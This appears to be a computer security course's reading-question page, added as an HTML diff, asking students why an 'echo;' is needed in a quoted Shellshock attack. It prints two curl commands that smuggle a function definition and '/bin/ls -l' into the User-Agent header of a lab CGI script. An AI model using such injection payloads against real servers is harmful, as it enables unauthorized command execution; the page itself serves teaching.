@@ -1,0 +1,57 @@
+<html>
+<HEAD>
+    <TITLE>
+        Computer Security: Home Page
+    </TITLE>
+    <META http-equiv=Content-Type
+          content="text/html; charset=gb2312">
+</HEAD>
+
+
+<body>
+<font face="Trebuchet MS"/>
+<table cellPadding=10 align=left border=0>
+    <tbody>
+    <tr>
+        <td>
+            <h3>Reading Questions</h3>
+            <p>
+                Remember to submit your
+                answer to this question <b>BEFORE</b> the next
+                class.
+            </p>
+            <div style="margin: 1pc 4% 0pc 4%;
+                  padding: 0.5pc 0.5pc 0.5pc 0.5pc;
+                  background-color: #e0e0ff;
+                  border: 1px dashed red; width: 800px">
+                <p>
+                    The following command comes from page 53 of
+                    the Computer Security:
+                </p>
+                <pre>
+                    $ curl -A "() { echo hello;};
+                               echo  Content_type: text/plain; echo; /bin/ls -l"
+                               http://10.0.2.69/cgi-bin/test.cgi
+                </pre>
+                <p>
+                    If we remove the <tt>echo;</tt> from the command:
+                </p>
+                <pre>
+                    $ curl -A "() { echo hello;};
+                               echo  Content_type: text/plain; /bin/ls -l"
+                               http://10.0.2.69/cgi-bin/test.cgi
+                </pre>
+                <p>
+                    Please write down whether it is possible to
+                    delete the <tt>echo;</tt> and why. For this
+                    question you may need refer to the
+                    <a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">HTTP</a>
+                    protocol.
+                </p>
+            </div>
+        </td>
+    </tr>
+    </tbody>
+</table>
+</body>
+</html>
